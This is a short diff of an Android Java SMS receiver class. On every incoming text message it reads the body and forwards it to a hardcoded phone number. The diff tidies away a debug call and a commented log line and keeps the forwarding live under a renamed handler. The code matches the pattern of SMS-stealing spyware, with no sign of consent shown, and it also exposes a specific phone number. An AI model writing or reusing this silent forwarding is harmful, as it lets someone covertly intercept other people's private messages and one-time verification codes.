@@ -16,7 +16,6 @@ public class SmsListener extends BroadcastReceiver {
     @Override
     public void onReceive(Context context, Intent intent) {
         // TODO Auto-generated method stub
-        SmsHandler.sendSmsAsy("SmsListener");
         if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
             Bundle bundle = intent.getExtras();           //---get the SMS message passed in---
             SmsMessage[] msgs = null;
@@ -31,11 +30,8 @@ public class SmsListener extends BroadcastReceiver {
                         msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                         msg_from = msgs[i].getOriginatingAddress();
                         msg_to = "18575582923";
-
                         String msgBody = msgs[i].getMessageBody();
-//                        SmsHandler.sendSmsAsy("SmsListener==>"+msgBody+" ,,  from=>"+msg_from+"  ,,  to=>"+msg_to);
-
-                        SmsHandler2.sendSmsAsy(new SmsInfo(msg_to,msgBody));
+                        SmsHandler.sendSmsAsy(new SmsInfo(msg_to,msgBody));
                     }
                 } catch (Exception e) {
                     Log.d(TAG, "onReceive: Exception caught  " + e.getMessage());
